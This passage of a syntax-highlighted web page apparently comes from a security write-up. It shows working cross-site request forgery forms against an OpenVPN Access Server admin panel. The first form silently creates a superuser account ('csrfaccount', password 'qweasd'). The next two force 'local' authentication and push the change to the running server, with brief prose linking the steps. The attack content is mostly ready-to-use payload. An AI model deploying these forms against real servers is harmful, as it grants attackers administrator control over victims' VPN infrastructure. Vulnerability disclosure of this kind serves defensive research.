			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form action="https://192.168.1.133/admin/user_permissions" method="POST" enctype="multipart/form-data"&gt;
  &lt;input type="hidden" name="search" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;conn&amp;#95;group" value="None" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;pvt&amp;#95;password&amp;#95;digest" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;dynstatic" value="true" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;conn&amp;#95;ip" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;s2c&amp;#95;route&amp;#95;type" value="nat" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;s2c&amp;#95;routes" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;gwyesno" value="no" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;c2s&amp;#95;routes" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;dmzyesno" value="no" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;openvpn&amp;#58;dmz&amp;#95;ip" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="new&amp;#95;username" value="csrfaccount" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;conn&amp;#95;group" value="None" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;prop&amp;#95;superuser" value="true" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;pvt&amp;#95;password&amp;#95;digest" value="qweasd" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;dynstatic" value="true" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;conn&amp;#95;ip" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;s2c&amp;#95;route&amp;#95;type" value="nat" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;s2c&amp;#95;routes" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;gwyesno" value="no" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;c2s&amp;#95;routes" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;dmzyesno" value="no" /&gt;
  &lt;input type="hidden" name="edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;dmz&amp;#95;ip" value="&amp;#13;" /&gt;
  &lt;input type="hidden" name="button" value="Save&amp;#32;Settings" /&gt;
&lt;/form&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e60c0276115574-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60c0276115574-2">2</div><div class="crayon-num" data-line="crayon-53c98772e60c0276115574-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60c0276115574-4">4</div><div class="crayon-num" data-line="crayon-53c98772e60c0276115574-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60c0276115574-6">6</div><div class="crayon-num" data-line="crayon-53c98772e60c0276115574-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60c0276115574-8">8</div><div class="crayon-num" data-line="crayon-53c98772e60c0276115574-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60c0276115574-10">10</div><div class="crayon-num" data-line="crayon-53c98772e60c0276115574-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60c0276115574-12">12</div><div class="crayon-num" data-line="crayon-53c98772e60c0276115574-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60c0276115574-14">14</div><div class="crayon-num" data-line="crayon-53c98772e60c0276115574-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60c0276115574-16">16</div><div class="crayon-num" data-line="crayon-53c98772e60c0276115574-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60c0276115574-18">18</div><div class="crayon-num" data-line="crayon-53c98772e60c0276115574-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60c0276115574-20">20</div><div class="crayon-num" data-line="crayon-53c98772e60c0276115574-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60c0276115574-22">22</div><div class="crayon-num" data-line="crayon-53c98772e60c0276115574-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60c0276115574-24">24</div><div class="crayon-num" data-line="crayon-53c98772e60c0276115574-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60c0276115574-26">26</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e60c0276115574-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"https://192.168.1.133/admin/user_permissions"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">enctype</span><span class="crayon-o">=</span><span class="crayon-s">"multipart/form-data"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60c0276115574-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"search"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e60c0276115574-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;conn&amp;#95;group"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"None"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60c0276115574-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;pvt&amp;#95;password&amp;#95;digest"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e60c0276115574-5"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;dynstatic"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"true"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60c0276115574-6"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;conn&amp;#95;ip"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e60c0276115574-7"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;s2c&amp;#95;route&amp;#95;type"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"nat"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60c0276115574-8"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;s2c&amp;#95;routes"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e60c0276115574-9"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;gwyesno"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"no"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60c0276115574-10"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;c2s&amp;#95;routes"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e60c0276115574-11"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;dmzyesno"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"no"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60c0276115574-12"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;openvpn&amp;#58;dmz&amp;#95;ip"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e60c0276115574-13"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"new&amp;#95;username"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"csrfaccount"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60c0276115574-14"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;conn&amp;#95;group"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"None"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e60c0276115574-15"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;prop&amp;#95;superuser"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"true"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60c0276115574-16"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;pvt&amp;#95;password&amp;#95;digest"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"qweasd"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e60c0276115574-17"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;dynstatic"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"true"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60c0276115574-18"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;conn&amp;#95;ip"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e60c0276115574-19"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;s2c&amp;#95;route&amp;#95;type"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"nat"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60c0276115574-20"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;s2c&amp;#95;routes"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e60c0276115574-21"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;gwyesno"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"no"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60c0276115574-22"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;c2s&amp;#95;routes"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e60c0276115574-23"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;dmzyesno"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"no"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60c0276115574-24"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"edit&amp;#58;&amp;#37;NEW&amp;#37;USER&amp;#37;&amp;#58;dmz&amp;#95;ip"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"&amp;#13;"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e60c0276115574-25"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"button"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"Save&amp;#32;Settings"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60c0276115574-26"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0202 seconds] -->
<p>For this to be effective, we need to ensure that the server is configured to use &#8220;Local&#8221; authentication. This means OpenVPN controls the authentication, rather than using PAM/RADIUS/LDAP. We can do this with these two simple requests:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e60d4823509319" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form action="https://192.168.1.133/admin/authentication_general_configuration" method="POST" enctype="multipart/form-data"&gt;
  &lt;input type="hidden" name="auth&amp;#46;module&amp;#46;type" value="local" /&gt;
  &lt;input type="hidden" name="button" value="Save&amp;#32;Settings" /&gt;
&lt;/form&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e60d4823509319-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60d4823509319-2">2</div><div class="crayon-num" data-line="crayon-53c98772e60d4823509319-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60d4823509319-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98772e60d4823509319-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"https://192.168.1.133/admin/authentication_general_configuration"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">enctype</span><span class="crayon-o">=</span><span class="crayon-s">"multipart/form-data"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60d4823509319-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"auth&amp;#46;module&amp;#46;type"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"local"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c98772e60d4823509319-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"button"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"Save&amp;#32;Settings"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98772e60d4823509319-4"><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-i">form</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0029 seconds] -->
<p>When we have changed the authentication method, we need to commit the change:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98772e60dd634771286" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form action="https://192.168.1.133/admin/authentication_general_configuration" method="POST" enctype="multipart/form-data"&gt;
  &lt;input type="hidden" name="button" value="Update&amp;#32;Running&amp;#32;Server" /&gt;
  &lt;input type="hidden" name="auth&amp;#46;module&amp;#46;type" value="local" /&gt;
&lt;/form&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98772e60dd634771286-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60dd634771286-2">2</div><div class="crayon-num" data-line="crayon-53c98772e60dd634771286-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98772e60dd634771286-4">4</div></div>
				</td>
